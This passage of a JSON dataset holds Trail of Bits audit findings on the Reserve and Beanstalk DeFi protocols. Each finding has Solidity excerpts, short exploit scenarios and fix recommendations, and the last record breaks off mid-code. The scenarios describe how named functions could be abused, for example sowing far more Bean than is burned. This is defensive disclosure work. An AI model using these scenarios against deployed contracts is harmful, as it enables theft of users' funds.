      "content": "## Reserve Protocol Security Assessment\n\n**Difficulty:** High  \n**Type:** Data Validation\n\n## Description\nThe Reserve protocol contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised.\n\nHigh-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported.\n\nA compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.\n\n## Exploit Scenario\nA latent or future bug in Solidity compiler optimizations—or in the Emscripten transpilation to solc-js—causes a security vulnerability in the Reserve protocol contracts.\n\n## Recommendations\n- Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug.\n\n**Trail of Bits**  \n**Reserve Protocol Security Assessment**  \n**PUBLIC**",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "21271",
      "title": "Unchecked burnFrom return value",
      "impact": "LOW",
      "content": "## Target\n\n`protocol/contracts/farm/facets/UnripeFacet.sol`\n\n## Description\n\nWhile recapitalizing the Beanstalk protocol, Bean and LP tokens that existed before the 2022 governance hack are represented as unripe tokens. Ripening is the process of burning unripe tokens in exchange for a pro rata share of the underlying assets generated during the Barn Raise. Holders of unripe tokens call the `ripen` function to receive their portion of the recovered underlying assets. This portion grows while the price of Bean is above its peg, incentivizing users to ripen their tokens later, when more of the loss has been recovered.\n\nThe `ripen` code assumes that if users try to redeem more unripe tokens than they hold, `burnFrom` will revert. If `burnFrom` returns `false` instead of reverting, the failure of the balance check will go undetected, and the caller will be able to recover all of the underlying tokens held by the contract. While `LibUnripe.decrementUnderlying` will revert on calls to ripen more than the contract’s balance, it does not check the user’s balance.\n\nThe source code of the `unripeToken` contract was not provided for review during this audit, so we could not determine whether its `burnFrom` method is implemented safely.\n\n```solidity\nfunction ripen(\n    address unripeToken,\n    uint256 amount,\n    LibTransfer.To mode\n) external payable nonReentrant returns (uint256 underlyingAmount) {\n    underlyingAmount = getPenalizedUnderlying(unripeToken, amount);\n    LibUnripe.decrementUnderlying(unripeToken, underlyingAmount);\n    IBean(unripeToken).burnFrom(msg.sender, amount);\n    address underlyingToken = s.u[unripeToken].underlyingToken;\n    IERC20(underlyingToken).sendToken(underlyingAmount, msg.sender, mode);\n    emit Ripen(msg.sender, unripeToken, amount, underlyingAmount);\n}\n```\n*Figure 13.1: The `ripen()` function in UnripeFacet.sol#L51-67*\n\n## Exploit Scenario\n\nAlice notices that the `burnFrom` function is implemented incorrectly in the `unripeToken` contract. She calls `ripen` with an amount greater than her unripe token balance and is able to receive the contract’s entire balance of underlying tokens.\n\n## Recommendations\n\n- Short term, add an `assert` statement to ensure that users who call `ripen` have sufficient balance to burn the given amount of unripe tokens.\n  \n- Long term, implement all security-critical assertions on user-supplied input at the beginning of external functions. Do not rely on untrusted code to perform required safety checks or to behave as expected.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21270",
      "title": "Ability to whitelist assets uncorrelated with Bean price, misaligning governance incentives",
      "impact": "LOW",
      "content": "## Beanstalk Security Assessment\n\n## Difficulty\nUndetermined\n\n## Type\nUndefined Behavior\n\n## Target\nThe Beanstalk protocol\n\n## Description\nStalk is the governance token of the system, rewarded to users who deposit certain whitelisted assets into the silo, the system’s asset storage. When demand for Bean increases, the protocol increases the Bean supply by minting new Bean tokens and allocating some of them to Stalk holders. \n\nAdditionally, if the price of Bean remains above its peg for an extended period of time, then a season of plenty (SoP) occurs: Bean is minted and sold on the open market in exchange for exogenous assets such as ETH. These exogenous assets are allocated entirely to Stalk holders.\n\nWhen demand for Bean decreases, the protocol decreases the Bean supply by borrowing Bean tokens from Bean owners. If the demand for Bean is persistently low and some of these loans are never repaid, Stalk holders are not directly penalized by the protocol. However, if the only whitelisted assets are strongly correlated with the price of Bean (such as ETH:BEAN LP tokens), then the value of Stalk holders’ deposited collateral would decline, indirectly penalizing Stalk holders for an unhealthy system.\n\nIf, however, exogenous assets without a strong correlation to Bean are whitelisted, then Stalk holders who have deposited such assets will be protected from financial penalties if the price of Bean crashes.\n\n## Exploit Scenario\nStalk holders vote to whitelist ETH as a depositable asset. They proceed to deposit ETH and begin receiving shares of rewards, including 3CRV tokens acquired during SoPs. Governance is now incentivized to increase the supply of Bean as high as possible to obtain more 3CRV rewards, which eventually results in an overextension of the Bean supply and a subsequent price crash. After the Bean price crashes, Stalk holders withdraw their deposited ETH and 3CRV rewards. Because ETH is not strongly correlated with the price of Bean, they do not suffer financial loss as a result of the crash.\n\nAlternatively, because of the lack of on-chain enforcement of off-chain votes, the above scenario could occur if the community multisignature wallet whitelists ETH, even if no related vote occurred.\n\n## Recommendations\n- Do not allow any assets that are not strongly correlated with the price of Bean to be whitelisted.\n- Additionally, implement monitoring systems that provide alerts every time a new asset is whitelisted.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21269",
      "title": "Bean and the o�er backing it are strongly correlated",
      "impact": "LOW",
      "content": "## Beanstalk Security Assessment\n\n**Difficulty:** Undetermined\n\n**Type:** Economic\n\n**Target:** The Beanstalk protocol\n\n## Description\n\nIn response to prolonged periods of decreasing demand for Bean tokens, the Beanstalk protocol offers to borrow from users who own Bean tokens, decreasing the available Bean supply and returning the Bean price to its peg. To incentivize users to lend their Bean tokens to the protocol rather than immediately selling them in the market, which would put further downward pressure on the price of Bean, the protocol offers users a reward of more Bean tokens in the future.\n\nThe demand for holding Bean tokens at present and the demand for receiving Bean tokens in the future are strongly correlated, introducing reflexive risk. If the demand for Bean decreases, we can expect a proportional increase in the marginal Bean supply and a decrease in demand to receive Bean in the future, weakening the system’s ability to restore Bean to its value peg.\n\nThe FIFO queue of lenders is designed to combat reflexivity by encouraging rational actors to quickly support a dip in Bean price rather than selling. However, this mechanism assumes that the demand for Bean will increase in the future; investors may not share this assumption if present demand for Bean is low. Reflexivity is present whenever a stablecoin and the offer backing it are strongly correlated, even if the backing offer is time sensitive.\n\n## Exploit Scenario\n\nBean goes through an extended period of increasing demand, overextending its supply. Then, the demand for Bean slowly and steadily declines as some users lose interest in holding Bean. These same users also lose interest in receiving Bean tokens in the future, so rather than loaning their tokens to Beanstalk to earn a very high Bean-denominated yield, they sell.\n\n## Recommendations\n\nExplore options for backing Bean’s value with an offer that is not correlated with demand for Bean.\n\n---\n\n**Trail of Bits**  \nBeanstalk Security Assessment  \nPUBLIC",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21268",
      "title": "Pods may never ripen",
      "impact": "LOW",
      "content": "## Beanstalk Security Assessment\n\n**Diﬃculty:** Undetermined\n\n**Type:** Economic\n\n**Target:** The Beanstalk protocol\n\n## Description\n\nWhenever the price of Bean is below its peg, the protocol takes Bean tokens oﬀ the market in exchange for a number of pods dependent on the current interest rate. Essentially, Bean owners loan their tokens to the protocol and receive pods in exchange. We can think of pods as loans that are repaid on a FIFO basis as the protocol issues new Bean tokens. A group of pods that are created together is called a plot.\n\nThe queue of plots is referred to as the pod line. The pod line has no practical bound on its length, so during periods of decreasing demand, it can grow indeﬁnitely. No yield is awarded until the given plot owner is first in line and until the price of Bean is above its value peg.\n\nWhile the protocol does not default on its debt, the only way for pods to ripen is if demand increases enough for the price of Bean to be above its value peg for some time. While the price of Bean is above its peg, a portion of newly minted Bean tokens is used to repay the first plot in the pod line until fully repaid, decreasing the length of the pod line.\n\nDuring an extended period of decreasing supply, the pod line could grow long enough that lenders receive an unappealing time-weighted rate of return, even if the yield is increased; a sufficiently long pod line could encourage users—uncertain of whether future demand will grow enough for them to be repaid—to sell their Bean tokens rather than lending them to the protocol. Under such circumstances, the protocol will be unable to disincentivize Bean market sales, disrupting its ability to return Bean to its value peg.\n\n## Exploit Scenario\n\nBean goes through an extended period of increasing demand, overextending its supply. Then, demand for Bean tokens slowly and steadily declines, and the pod line grows in length. At a certain point, some users decide that their time-weighted rate of return is unfavorable or too uncertain despite the promised high yields. Instead of lending their Bean tokens to the protocol, they sell.\n\n## Recommendations\n\nExplore options for backing Bean’s value with an offer that is guaranteed to eventually be fulfilled.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21267",
      "title": "Users can sow more Bean tokens than are burned",
      "impact": "HIGH",
      "content": "## Beanstalk Security Assessment\n\n## Diﬃculty: \nUndetermined\n\n## Type: \nEconomic\n\n## Target: \n`protocol/contracts/farm/facets/FieldFacet.sol`\n\n## Description\nAn accounting error allows users to sow more Bean tokens than the available soil allows. Whenever the price of Bean is below its peg, the protocol issues soil, representing the willingness of the protocol to take Bean tokens off the market in exchange for a pod. Essentially, Bean owners loan their tokens to the protocol and receive pods in exchange. We can think of pods as non-callable bonds that mature on a first-in-first-out (FIFO) basis as the protocol issues new Bean tokens.\n\nWhenever soil is available, users can call the `sow()` and `sowWithMin()` functions in the `FieldFacet` contract.\n\n### Function: `sowWithMin`\n```solidity\nfunction sowWithMin(\n    uint256 amount,\n    uint256 minAmount,\n    LibTransfer.From mode\n) public payable returns (uint256) {\n    uint256 sowAmount = s.f.soil;\n    require(\n        sowAmount >= minAmount && amount >= minAmount && minAmount > 0,\n        \"Field: Sowing below min or 0 pods.\"\n    );\n    if (amount < sowAmount) sowAmount = amount;\n    return _sow(sowAmount, mode);\n}\n```\n*Figure 9.1: The `sowWithMin()` function in `FieldFacet.sol#L41-53`*\n\nThe `sowWithMin()` function ensures that there is enough soil to sow the given number of Bean tokens and that the call will not sow fewer tokens than the specified `minAmount`. Once it makes these checks, it calls the `_sow()` function.\n\n### Function: `_sow`\n```solidity\nfunction _sow(uint256 amount, LibTransfer.From mode)\n    internal\n    returns (uint256 pods)\n{\n    pods = LibDibbler.sow(amount, msg.sender);\n    if (mode == LibTransfer.From.EXTERNAL)\n        C.bean().burnFrom(msg.sender, amount);\n    else {\n        amount = LibTransfer.receiveToken(C.bean(), amount, msg.sender, mode);\n        C.bean().burn(amount);\n    }\n}\n```\n*Figure 9.2: The `_sow()` function in `FieldFacet.sol#L55-65`*\n\nThe `_sow()` function first calculates the number of pods that will be sown by calling the `sow()` function in the `LibDibbler` library, which performs the internal accounting and calculates the number of pods that the user is entitled to.\n\n### Function: `sow`\n```solidity\nfunction sow(uint256 amount, address account) internal returns (uint256) {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    // We can assume amount <= soil from getSowAmount\n    s.f.soil = s.f.soil - amount;\n    return sowNoSoil(amount, account);\n}\n```\n\n### Function: `sowNoSoil`\n```solidity\nfunction sowNoSoil(uint256 amount, address account) internal returns (uint256) {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    uint256 pods = beansToPods(amount, s.w.yield);\n    sowPlot(account, amount, pods);\n    s.f.pods = s.f.pods.add(pods);\n    saveSowTime();\n    return pods;\n}\n```\n\n### Function: `sowPlot`\n```solidity\nfunction sowPlot(\n    address account,\n    uint256 beans,\n    uint256 pods\n) private {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    s.a[account].field.plots[s.f.pods] = pods;\n    emit Sow(account, s.f.pods, beans, pods);\n}\n```\n*Figure 9.3: The `sow()`, `sowNoSoil()`, and `sowPlot()` functions in `LibDibbler.sol#L41-53`*\n\nFinally, the `sowWithMin()` function burns the Bean tokens from the caller’s account, removing them from the supply. To do so, the function calls `burnFrom()` if the mode parameter is `EXTERNAL` (i.e., if the Bean tokens to be burned are not escrowed in the contract) and `burn()` if the Bean tokens are escrowed.\n\nIf the `mode` parameter is not `EXTERNAL`, the `receiveToken()` function is executed to update the internal accounting of the contract before burning the tokens. This function returns the number of tokens that were “transferred” into the contract.\n\n### Function: `receiveToken`\n```solidity\nfunction receiveToken(\n    IERC20 token,\n    uint256 amount,\n    address sender,\n    From mode\n) internal returns (uint256 receivedAmount) {\n    if (amount == 0) return 0;\n    if (mode != From.EXTERNAL) {\n        receivedAmount = LibBalance.decreaseInternalBalance(\n            sender,\n            token,\n            amount,\n            mode != From.INTERNAL\n        );\n        if (amount == receivedAmount || mode == From.INTERNAL_TOLERANT)\n            return receivedAmount;\n    }\n    token.safeTransferFrom(sender, address(this), amount - receivedAmount);\n    return amount;\n}\n```\n*Figure 9.4: The `receiveToken()` function in `FieldFacet.sol#L41-53`*\n\nHowever, if the `mode` parameter is `INTERNAL_TOLERANT`, the contract allows the user to partially fill `amount` (i.e., to transfer as much as the user can), which means that if the user does not own the given amount of Bean tokens, the protocol simply burns as many tokens as the user owns but still allows the user to sow the full amount.\n\n## Exploit Scenario\nEve, a malicious user, spots the vulnerability in the `FieldFacet` contract and waits until Bean is below its peg and the protocol starts issuing soil. Bean finally goes below its peg, and the protocol issues 1,000 soil. Eve deposits a single Bean token into the contract by calling the `transferToken()` function in the `TokenFacet` contract. She then calls the `sow()` function with `amount` equal to 1000 and `mode` equal to `INTERNAL_TOLERANT`. The `sow()` function is executed, sowing 1,000 Bean tokens but burning only a single token.\n\n## Recommendations\nShort term, modify the relevant code so that users’ Bean tokens are burned before the accounting for the soil and pods are updated and so that, if the `mode` field is not `EXTERNAL`, the amount returned by `receiveToken()` is used as the input to `LibDibbler.sow()`. \n\nLong term, thoroughly document the expected behavior of the `FieldFacet` contract and the properties (invariants) it should enforce, such as “the `sow()` function always sows as many Bean tokens as were burned.” Expand the unit test suite to test that these properties hold.",
      "summary": "\nThis bug report concerns a vulnerability in the FieldFacet contract that allows users to sow more Bean tokens than the available soil allows. The protocol issues soil whenever the price of Bean is below its peg, and users can call the sow() and sowWithMin() functions in the FieldFacet contract. The sowWithMin() function ensures that there is enough soil to sow the given number of Bean tokens and that the call will not sow fewer tokens than the specified minAmount. \n\nThe _sow() function first calculates the number of pods that will be sown by calling the sow() function in the LibDibbler library, which performs the internal accounting and calculates the number of pods that the user is entitled to. The sowWithMin() function then burns the Bean tokens from the caller’s account, removing them from the supply. To do so, the function calls burnFrom() if the mode parameter is EXTERNAL (i.e., if the Bean tokens to be burned are not escrowed in the contract) and burn() if the Bean tokens are escrowed. If the mode parameter is not EXTERNAL, the receiveToken() function is executed to update the internal accounting of the contract before burning the tokens. This function returns the number of tokens that were “transferred” into the contract.\n\nExploit Scenario: A malicious user, Eve, spots the vulnerability in the FieldFacet contract and waits until Bean is below its peg and the protocol starts issuing soil. When Bean goes below its peg, Eve deposits a single Bean token into the contract by calling the transferToken() function in the TokenFacet contract. Then, she calls the sow() function with amount equal to 1000 and mode equal to INTERNAL_TOLERANT. The sow() function is executed, sowing 1000 Bean tokens but burning only a single token.\n\nRecommendations: To fix this issue, the relevant code should be modified so that users’ Bean tokens are burned before the accounting for the soil and pods are updated and so that, if the mode field is not EXTERNAL, the amount returned by receiveToken() is used as the input to LibDibbler.sow(). In the long term, the expected behavior of the FieldFacet contract should be thoroughly documented and the unit test suite should be expanded to test that the properties hold.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21266",
      "title": "Plot transfers from users with allowances revert if the owner has an existing pod listing",
      "impact": "LOW",
      "content": "## Beanstalk Security Assessment\n\n## Difficulty\nLow\n\n## Type\nData Validation\n\n## Target\n`protocol/contracts/farm/facets/MarketplaceFacet.sol`\n\n## Description\nWhenever a plot transfer is executed by a user with an allowance (i.e., a transfer in which the caller was approved by the plot’s owner), the transfer will revert if there is an existing listing for the pods contained in that plot.\n\nThe `MarketplaceFacet` contract exposes a function, `transferPlot()`, that allows the owner of a plot to transfer the pods in that plot to another user; additionally, the owner of a plot can call the `approvePods()` function (Figure 8.1) to approve other users to transfer these pods on the owner’s behalf.\n\n```solidity\nfunction approvePods(address spender, uint256 amount) external payable nonReentrant {\n    require(spender != address(0), \"Field: Pod Approve to 0 address.\");\n    setAllowancePods(msg.sender, spender, amount);\n    emit PodApproval(msg.sender, spender, amount);\n}\n```\n*Figure 8.1: The `approvePods()` function in `MarketplaceFacet.sol#L147-155`*\n\nOnce approved, the given address can call the `transferPlot()` function to transfer pods on the owner’s behalf. The function checks and decreases the allowance and then checks whether there is an existing pod listing for the target pods. If there is an existing listing, the function tries to cancel it by calling the `_cancelPodListing()` function.\n\n```solidity\nfunction transferPlot(\n    address sender,\n    address recipient,\n    uint256 id,\n    uint256 start,\n    uint256 end\n) external payable nonReentrant {\n    require(sender != address(0) && recipient != address(0), \"Field: Transfer to/from 0 address.\");\n    uint256 amount = s.a[sender].field.plots[id];\n    require(amount > 0, \"Field: Plot not owned by user.\");\n    require(end > start && amount >= end, \"Field: Pod range invalid.\");\n    amount = end - start; // Note: SafeMath is redundant here.\n    if (msg.sender != sender && allowancePods(sender, msg.sender) != uint256(-1)) {\n        decrementAllowancePods(sender, msg.sender, amount);\n    }\n    if (s.podListings[id] != bytes32(0)) {\n        _cancelPodListing(id); // TODO: Look into this cancelling.\n    }\n    _transferPlot(sender, recipient, id, start, amount);\n}\n```\n*Figure 8.2: The `transferPlot()` function in `MarketplaceFacet.sol#L119-145`*\n\nThe `_cancelPodListing()` function receives only an `id` as the input and relies on the `msg.sender` to determine the listing’s owner. However, if the transfer is executed by a user with an allowance, the `msg.sender` is the user who was granted the allowance, not the owner of the listing. As a result, the function will revert.\n\n```solidity\nfunction _cancelPodListing(uint256 index) internal {\n    require(s.a[msg.sender].field.plots[index] > 0, \"Marketplace: Listing not owned by sender.\");\n    delete s.podListings[index];\n    emit PodListingCancelled(msg.sender, index);\n}\n```\n*Figure 8.3: The `_cancelPodListing()` function in `Listing.sol#L149-156`*\n\n## Exploit Scenario\nA new smart contract that integrates with the `MarketplaceFacet` contract is deployed. This contract has features allowing it to manage users’ pods on their behalf. Alice approves the contract so that it can manage her pods. Some time passes, and Alice calls one of the smart contract’s functions, which requires Alice to transfer ownership of her plot to the contract. Because Alice has already approved the smart contract, it can perform the transfer on her behalf. To do so, it calls the `transferPlot()` function in the `MarketplaceFacet` contract; however, this call reverts because Alice has an open listing for the pods that the contract is trying to transfer.\n\n## Recommendations\nShort term, add a new input to `_cancelPodListing()` that is equal to `msg.sender` if the caller is the owner of the listing but equal to the pod owner if the caller is a user who was approved by the owner.\n\nLong term, thoroughly document the expected behavior of the `MarketplaceFacet` contract and the properties (invariants) it should enforce, such as “plot transfers initiated by users with an allowance cancel the owner’s listing.” Expand the unit test suite to test that these properties hold.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21265",
      "title": "Lack of support for external transfers of nonstandard ERC20 tokens",
      "impact": "LOW",
      "content": "## Diﬃculty: Low\n\n## Type: Data Validation\n\n## Target: \n`protocol/contracts/farm/facets/TokenFacet.sol`\n\n## Description\nFor external transfers of nonstandard ERC20 tokens via the `TokenFacet` contract, the code uses the standard `transferFrom` operation from the given token contract without checking the operation’s `returndata`; as a result, successfully executed transactions that fail to transfer tokens will go unnoticed, causing confusion in users who believe their funds were successfully transferred.\n\nThe `TokenFacet` contract exposes `transferToken()`, an external function that users can call to transfer ERC20 tokens both to and from the contract and between users.\n\n```solidity\nfunction transferToken(\n    IERC20 token,\n    address recipient,\n    uint256 amount,\n    LibTransfer.From fromMode,\n    LibTransfer.To toMode\n) external payable {\n    LibTransfer.transferToken(token, recipient, amount, fromMode, toMode);\n}\n```\n*Figure 7.1: The `transferToken()` function in `TokenFacet.sol#L39-47`*\n\nThis function calls the `LibTransfer` library, which handles the token transfer.\n\n```solidity\nfunction transferToken(\n    IERC20 token,\n    address recipient,\n    uint256 amount,\n    From fromMode,\n    To toMode\n) internal returns (uint256 transferredAmount) {\n    if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {\n        token.transferFrom(msg.sender, recipient, amount);\n        return amount;\n    }\n    amount = receiveToken(token, amount, msg.sender, fromMode);\n    sendToken(token, amount, recipient, toMode);\n    return amount;\n}\n```\n*Figure 7.2: The `transferToken()` function in `LibTransfer.sol#L29-43`*\n\nThe `LibTransfer` library uses the `fromMode` and `toMode` values to determine a transfer’s sender and receiver, respectively; in most cases, it uses the `safeERC20` library to execute transfers. However, if `fromMode` and `toMode` are both marked as `EXTERNAL`, then the `transferFrom` function of the token contract will be called directly, and `safeERC20` will not be used. Essentially, if a user tries to transfer a nonstandard ERC20 token that does not revert on failure and instead indicates a transaction’s success or failure in its return data, the user could be led to believe that failed token transfers were successful.\n\n## Exploit Scenario\nAlice uses the `TokenFacet` contract to transfer nonstandard ERC20 tokens that return `false` on failure to another contract. However, Alice accidentally inputs an amount higher than her balance. The transaction is successfully executed, but because there is no check of the `false` return value, Alice does not know that her tokens were not transferred.\n\n## Recommendations\n- **Short term:** Use the `safeERC20` library for external token transfers.\n- **Long term:** Thoroughly review and document all interactions with arbitrary tokens to prevent similar issues from being introduced in the future.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21264",
      "title": "Solidity compiler optimizations can be problematic",
      "impact": "LOW",
      "content": "## Beanstalk Security Assessment\n\n**Difficulty**: Low  \n**Type**: Data Validation  \n**Target**: The Beanstalk protocol  \n\n## Description  \nBeanstalk has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised.\n\nHigh-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the Emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported.\n\nA compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. \n\nIt is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.\n\n## Exploit Scenario  \nA latent or future bug in Solidity compiler optimizations—or in the Emscripten transpilation to solc-js—causes a security vulnerability in the Beanstalk contracts.\n\n## Recommendations  \n- **Short term**: Measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug.\n- **Long term**: Monitor the development and adoption of Solidity compiler optimizations to assess their maturity.\n\n**Trail of Bits**  \nBeanstalk Security Assessment  \n**PUBLIC**",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21263",
      "title": "The sunrise() function rewards callers only with the base incentive",
      "impact": "MEDIUM",
      "content": "## Beanstalk Security Assessment\n\n## Difficulty: Low\n\n## Type: Undefined Behavior\n\n## Target: \n`protocol/contracts/farm/facets/SeasonFacet/SeasonFacet.sol`\n\n## Description\nThe increasing incentive that encourages users to call the `sunrise()` function in a timely manner is not actually applied. According to the Beanstalk white paper, the reward paid to users who call the `sunrise()` function should increase by 1% every second (for up to 300 seconds) after this method is eligible to be called; this incentive is designed so that, even when gas prices are high, the system can move on to the next season in a timely manner.\n\nThis increasing incentive is calculated and included in the emitted logs, but it is not actually applied to the number of Bean tokens rewarded to users who call `sunrise()`.\n\n```solidity\nfunction incentivize(address account, uint256 amount) private {\n    uint256 timestamp = block.timestamp.sub(\n        s.season.start.add(s.season.period.mul(season()))\n    );\n    if (timestamp > 300) timestamp = 300;\n    uint256 incentive = LibIncentive.fracExp(amount, 100, timestamp, 1);\n    C.bean().mint(account, amount);\n    emit Incentivization(account, incentive);\n}\n```\n_Figure 5.1: The incentive calculation in SeasonFacet.sol#70-78_\n\n## Exploit Scenario\nGas prices suddenly increase to the point that it is no longer profitable to call `sunrise()`. Given the lack of an increasing incentive, the function goes uncalled for several hours, preventing the system from reacting to changing market conditions.\n\n## Recommendations\n- **Short Term:** Pass the `incentive` value instead of `amount` into the `mint()` function call.\n- **Long Term:** Thoroughly document the expected behavior of the `SeasonFacet` contract and the properties (invariants) it should enforce, such as “the caller of the `sunrise()` function receives the right incentive.” Expand the unit test suite to test that these properties hold.\n\nAdditionally, thoroughly document how the system would be affected if the `sunrise()` function were not called for a long period of time (e.g., in times of extreme network congestion).\n\nFinally, determine whether the Beanstalk team should rely exclusively on third parties to call the `sunrise()` function or whether an alternate system managed by the Beanstalk team should be adopted in addition to the current system. For example, an alternate system could involve an off-chain monitoring system and a trusted execution flow.",
      "summary": "\nThis bug report is about an issue with the protocol/contracts/farm/facets/SeasonFacet/SeasonFacet.sol contract. The problem is that the increasing incentive that encourages users to call the sunrise() function in a timely manner is not actually applied. The reward paid to users who call the sunrise() function should increase by 1% every second (for up to 300 seconds) after this method is eligible to be called, but this is not happening.\n\nThe recommendation is to pass the incentive value instead of amount into the mint() function call in the short term, and to thoroughly document the expected behavior of the SeasonFacet contract and the properties (invariants) it should enforce in the long term. Additionally, the team should document how the system would be affected if the sunrise() function were not called for a long period of time, and determine whether the Beanstalk team should rely exclusively on third parties to call the sunrise() function or whether an alternate system managed by the Beanstalk team should be adopted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-07-beanstalk-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Jaime Iglesias",
        "Bo Henderson"
      ]
    },
    {
      "id": "21262",
      "title": "Risk of Fertilizer id collision that could result in loss of funds",
      "impact": "HIGH",
      "content": "## Beanstalk Security Assessment\n\n## Difficulty\n**Low**\n\n## Type\n**Data Validation**\n\n## Target\n`protocol/contracts/fertilizer/Fertilizer.sol`\n\n## Description\nIf a user mints Fertilizer tokens twice during two different seasons, the same token id for both tokens could be calculated, and the first entry will be overridden; if this occurs and the bpf value changes, the user would be entitled to less yield than expected.\n\nTo mint new Fertilizer tokens, users call the `mintFertilizer()` function in the `FertilizerFacet` contract. An id is calculated for each new Fertilizer token that is minted; not only is this id an identifier for the token, but it also represents the endBpf period, which is the moment at which the Fertilizer reaches “maturity” and can be redeemed without incurring any penalty.\n\n### Function: mintFertilizer\n```solidity\nfunction mintFertilizer(\n    uint128 amount,\n    uint256 minLP,\n    LibTransfer.From mode\n) external payable {\n    uint256 remaining = LibFertilizer.remainingRecapitalization();\n    uint256 _amount = uint256(amount);\n    if (_amount > remaining) _amount = remaining;\n    LibTransfer.receiveToken(\n        C.usdc(),\n        uint256(amount).mul(1e6),\n        msg.sender,\n        mode\n    );\n    uint128 id = LibFertilizer.addFertilizer(\n        uint128(s.season.current),\n        amount,\n        minLP\n    );\n    C.fertilizer().beanstalkMint(msg.sender, uint256(id),  amount, s.bpf);\n}\n```\n*Figure 4.1: The mintFertilizer() function in Fertilizer.sol#L35-55*\n\nThe id is calculated by the `addFertilizer()` function in the `LibFertilizer` library as the sum of 1 and the bpf and humidity values.\n\n### Function: addFertilizer\n```solidity\nfunction addFertilizer(\n    uint128 season,\n    uint128 amount,\n    uint256 minLP\n) internal returns (uint128 id) {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    uint256 _amount = uint256(amount);\n    // Calculate Beans Per Fertilizer and add to total owed\n    uint128 bpf = 